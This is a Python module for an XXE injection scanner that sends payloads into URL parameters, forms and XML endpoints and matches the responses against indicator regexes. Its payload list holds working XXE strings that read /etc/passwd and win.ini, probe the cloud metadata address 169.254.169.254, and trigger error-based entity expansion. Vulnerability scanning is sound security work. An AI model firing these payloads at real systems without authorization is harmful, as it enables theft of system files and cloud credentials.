"""
A03: XML External Entity (XXE) Injection Scanner

Injects XXE payloads into XML-accepting endpoints and forms.
"""
from __future__ import annotations

import re
from typing import Any, Dict, List, Optional

import requests


XXE_PAYLOADS = [
    # Basic file read
    ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
     'file:///etc/passwd'),
    # Windows
    ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
     'c:/windows/win.ini'),
    # SSRF via XXE
    ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><root>&xxe;</root>',
     'metadata'),
    # Error-based XXE
    ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root/>',
     'error-based'),
]

XXE_INDICATORS = [
    r'root:.*:/bin/(ba)?sh',   # /etc/passwd
    r'\[extensions\]',          # win.ini
    r'instanceId',              # cloud metadata via XXE SSRF
    r'xml.*error|entity.*error|external.*entity',  # Error-based
    r'SYSTEM.*file',
]

XML_CONTENT_TYPES = [
    'application/xml', 'text/xml', 'application/xhtml+xml',
    'application/soap+xml', 'application/atom+xml',
]

XML_PARAM_NAMES = ['xml', 'data', 'body', 'payload', 'input', 'content', 'soap', 'request']


class XXEScanner:
    """Scanner for XML External Entity injection."""

    def __init__(self, timeout: int = 10, session: Optional[requests.Session] = None) -> None:
        self.timeout = timeout
        self.session = session or requests.Session()
        if not session:
            self.session.headers.update({"User-Agent": "vuln-scanner/1.0"})

    def scan_url(self, url: str, params: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test URL parameters that look like XML data."""
        findings = []
        for param, value in params.items():
            if not self._looks_like_xml_param(param, value):
                continue
            print(f"Testing XXE on parameter: {param}")
            for payload, target in XXE_PAYLOADS:
                result = self._test_xxe(url, param, params, payload, target)
                if result:
                    findings.append(result)
                    break
        return findings

    def scan_form(self, form_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test XML-accepting forms for XXE."""
        findings = []
        action = form_data.get('action', '')
        method = (form_data.get('method') or 'GET').upper()
        inputs = form_data.get('inputs', [])
        enctype = form_data.get('enctype', '').lower()

        # Only test XML-accepting forms or forms with XML-looking params
        is_xml_form = any(ct in enctype for ct in XML_CONTENT_TYPES)
        baseline = {inp.get('name', ''): '' for inp in inputs if inp.get('name')}

        for param in baseline:
            if not (is_xml_form or self._looks_like_xml_param(param, '')):
                continue
            print(f"Testing XXE on form param: {param}")
            for payload, target in XXE_PAYLOADS:
                result = self._test_xxe(action, param, baseline, payload, target, method=method)
                if result:
                    findings.append(result)
                    break

        return findings

    # ------------------------------------------------------------------
    # Async methods (native aiohttp — used by AsyncScanEngine v3)
    # ------------------------------------------------------------------

    async def scan_url_async(self, url: str, params: Dict[str, Any], http) -> List[Dict[str, Any]]:
        findings = []
        for param, value in params.items():
            if not self._looks_like_xml_param(param, value):
                continue
            for payload, target in XXE_PAYLOADS:
                result = await self._test_xxe_async(url, param, params, payload, target, http)
                if result:
                    findings.append(result)
                    break
        return findings

    async def scan_form_async(self, form: Dict[str, Any], http) -> List[Dict[str, Any]]:
        findings = []
        action  = form.get('action', '')
        method  = (form.get('method') or 'GET').upper()
        inputs  = form.get('inputs', [])
        enctype = form.get('enctype', '').lower()
        is_xml_form = any(ct in enctype for ct in XML_CONTENT_TYPES)
        baseline = {inp.get('name', ''): '' for inp in inputs if inp.get('name')}
        for param in baseline:
            if not (is_xml_form or self._looks_like_xml_param(param, '')):
                continue
            for payload, target in XXE_PAYLOADS:
                result = await self._test_xxe_async(action, param, baseline, payload, target, http, method=method)
                if result:
                    findings.append(result)
                    break
        return findings

    async def _test_xxe_async(self, url, param, params, payload, target, http, method='GET'):
        try:
            data = params.copy()
            data[param] = payload
            if method.upper() == 'GET':
                resp = await http.get(url, params=data)
            else:
                resp = await http.post(url, data=data)
            if resp:
                return self._check_xxe_response(url, param, payload, target, resp)
        except Exception:
            pass
        return None

    # ------------------------------------------------------------------
    # Sync scan methods
    # ------------------------------------------------------------------

    def scan_xml_endpoint(self, url: str) -> List[Dict[str, Any]]:
        """Directly POST XXE payloads to a URL with XML Content-Type."""
        findings = []
        for payload, target in XXE_PAYLOADS:
            try:
                resp = self.session.post(
                    url,
                    data=payload,
                    headers={'Content-Type': 'application/xml'},
                    timeout=self.timeout,
                )
                vuln = self._check_xxe_response(url, 'body', payload, target, resp)
                if vuln:
                    findings.append(vuln)
                    break
            except requests.RequestException:
                pass
        return findings

    def _looks_like_xml_param(self, name: str, value: str) -> bool:
        name_lower = name.lower()
        if any(kw in name_lower for kw in XML_PARAM_NAMES):
            return True
        if value and value.strip().startswith('<'):
            return True
        return False

    def _test_xxe(
        self, url, param, params, payload, target, method='GET'
    ) -> Optional[Dict[str, Any]]:
        try:
            data = params.copy()
            data[param] = payload

            if method.upper() == 'GET':
                resp = self.session.get(url, params=data, timeout=self.timeout)
            else:
                resp = self.session.post(url, data=data, timeout=self.timeout)

            return self._check_xxe_response(url, param, payload, target, resp)

        except requests.RequestException as exc:
            print(f"XXE test failed for {param}: {exc}")
        return None

    def _check_xxe_response(self, url, param, payload, target, resp) -> Optional[Dict[str, Any]]:
        text = resp.text or ''
        for indicator in XXE_INDICATORS:
            if re.search(indicator, text, re.IGNORECASE):
                return {
                    'vulnerable': True,
                    'type': 'xxe',
                    'param': param,
                    'payload': payload[:80],
                    'evidence': f'XXE indicator in response: matched pattern "{indicator}"',
                    'confidence': 90,
                    'url': url,
                }
        return None